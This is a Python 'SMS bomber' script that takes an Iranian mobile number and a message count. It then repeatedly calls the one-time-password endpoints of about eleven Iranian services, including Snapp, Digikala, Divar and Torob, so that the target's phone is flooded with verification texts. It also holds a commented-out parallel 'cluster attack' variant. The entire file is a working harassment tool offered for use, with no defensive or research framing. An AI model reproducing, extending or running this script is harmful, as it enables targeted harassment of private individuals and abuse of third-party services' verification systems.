from sys import exit
from requests import post, get
from os import name, system
from time import sleep
import datetime
#import concurrent.futures

def current_time():
    return str(datetime.datetime.now())[12:19]

def clear():
    if name == 'nt':
        _= system('cls')
    else:
        _ = system('clear')

#--------[ APIs ]--------#
snapp = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
tapsi = 'https://api.tapsi.cab/api/v2.2/user'
digikala = 'https://api.digikala.com/v1/user/authenticate/'
basalam = 'https://auth.basalam.com/otp-request'
tamland = 'https://api.tamland.ir/api/user/signup'
alibaba = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
divar = 'https://api.divar.ir/v5/auth/authenticate'
anten = 'https://api2.anten.ir/users'
torob = 'https://api.torob.com/v4/user/phone/send-pin/?phone_number=' 
ponisha = 'https://ponisha.ir/send-mobile-verfication'

#--------[ COLORS ]--------#
red = '\033[31m'
lightred = '\033[91m'
yellow = '\033[93m'
green = '\033[92m'
blue = '\033[94m'
purple = '\033[95m'
white = '\033[37m'

developer = f'{white}R4V3N'
github = f'{white}https://github.com/ravenovsky'
example = f'{white}09112223344'

#--------[ REQUEST COUNT HANDLING ]--------#
sent = 0
bad = 0
lost = 0 

clear()
print(f"""{red}
   ____   __  __  ____   ____    ___   __  __  ____   _____  ____  
  / ___| |  \/  |/ ___| | __ )  / _ \ |  \/  || __ ) | ____||  _ \   
  \___ \ | |\/| |\___ \ |  _ \ | | | || |\/| ||  _ \ |  _|  | |_) |  {lightred}-> Developer: {developer}{red}
   ___) || |  | | ___) || |_) || |_| || |  | || |_) || |___ |  _ <   {lightred}-> Github: {github}{red}
  |____/ |_|  |_||____/ |____/  \___/ |_|  |_||____/ |_____||_| \_\\  {lightred}-> Usage: {example}{red} 
                                                                                                                                     
""")

phone_number = input(f'   [?] Enter Phone number: {white}')
phone_number = phone_number.replace(' ','')

if len(phone_number) < 11:
    print(f'\n   {red}[-]{lightred} Input is less than 11 characters!')
    exit()
elif len(phone_number) > 11:
    print(f'\n   {red}[-]{lightred} Input is more than 11 characters!')
    exit()
elif phone_number[:2] != '09':
    print(f'\n   {red}[-]{lightred} Input is not following the pattern!')
    exit()  
for char in phone_number:
    if char not in list(map(str, range(10))):
        print(f'\n   {red}[-]{lightred} Input contains invalid character(s)!')
        exit()
phone_number_A = phone_number[1:]
phone_number_B = '+98'+phone_number[1:]
count = input(f'{red}   [?] Enter the count of messages: {white}')
for chr in count:
    if chr not in list(map(str, range(10))):
        print(f'\n   {red}[-]{lightred} Input contains invalid character(s)!')
        exit()
print('\n')

#--------[ FUNCTIONS ]--------#
def snapp_api():
    global sent, bad, lost
    try:    
        data = {"cellphone":phone_number_B}
        req = post(snapp, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Snapp')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Snapp')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Snapp')
        lost+=1

def tapsi_api():
    global sent, bad, lost
    try:    
        data = {"credential": {"phoneNumber": phone_number,"role": "PASSENGER"},"otpOption": "SMS"}
        req = post(tapsi, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Tapsi')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Tapsi')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Tapsi')
        lost+=1

def digikala_api():
    global sent, bad, lost
    try:    
        data = {"username":phone_number}
        req = post(digikala, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Digikala')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Digikala')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Digikala')
        lost+=1

def basalam_api():
    global sent, bad, lost
    try:    
        data = {"mobile":phone_number}
        req = post(basalam, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Basalam')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Basalam')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Basalam')
        lost+=1

def tamland_api():
    global sent, bad, lost
    try:    
        data = {"Mobile":phone_number}
        req = post(tamland, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Tamland')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Tamland')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Tamland')
        lost+=1

def alibaba_api():
    global sent, bad, lost
    try:    
        data = {"phoneNumber":phone_number_A}
        req = post(alibaba, json=data, timeout=4)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Alibaba')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Alibaba')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Alibaba')
        lost+=1

def divar_api():
    global sent, bad, lost
    try:    
        data = {"phone":phone_number_A}
        req = post(divar, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Divar')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Divar')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Divar')
        lost+=1

def anten_api():
    global sent, bad, lost
    try: 
        data = {"phone":phone_number}   
        req = post(anten, json=data, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Anten')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Anten')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Anten')
        lost+=1

def snappdoctor_api():
    global sent, bad, lost
    try: 
        snappdoctor = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone_number}/sms?cCode=+98'  
        req = get(snappdoctor, timeout=3)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Snapp Doctor')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Snapp Doctor')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Snapp Doctor')
        lost+=1

def torob_api():
    global sent, bad, lost
    try:   
        req = get(torob+phone_number, timeout=2)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Torob')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Torob')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Torob')
        lost+=1

def ponisha_api():
    global sent, bad, lost
    try: 
        data = {"mobile":phone_number_B,"type":"1"}   
        req = post(ponisha, json=data, timeout=5)
        if req.status_code == 200:
            print(f'   {green}[ {current_time()} ] Sent Successfully --> API: Ponisha')
            sent+=1
        else:
            print(f'   {yellow}[ {current_time()} ] Bad Request --> CODE: [ {req.status_code} ] API: Ponisha')
            bad+=1
    except:
        print(f'   {lightred}[ {current_time()} ] Request Timeout --> API: Ponisha')
        lost+=1

#--------[ RESULT ]--------#    
def ending():
    print(f'''
    {red}| {lightred}Start: {white}{start_time}{lightred}  End: {white}{current_time()}
    {red}| {lightred}Sent: {white}{sent}{lightred}  Bad: {white}{bad}{lightred}  Lost: {white}{lost}
   ''')
    exit()

#--------[ CALLING FUNCTIONS ]--------#
def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tamland_api, tapsi_api, digikala_api, divar_api, ponisha_api]
start_time = current_time()
while True:
    for defs in def_list:
        if sent == int(count):
            ending()
        else:
            defs()
        
#--------[ CLUSTER AttACK ]--------#
#def_list = [torob_api, snapp_api, snappdoctor_api, basalam_api, alibaba_api, anten_api, tamland_api, tapsi_api, digikala_api, divar_api, ponisha_api]
#with concurrent.futures.ProcessPoolExecutor() as executor:
#    for defs in def_list:
#        executor.submit(defs)

#################### END OF CODE ####################
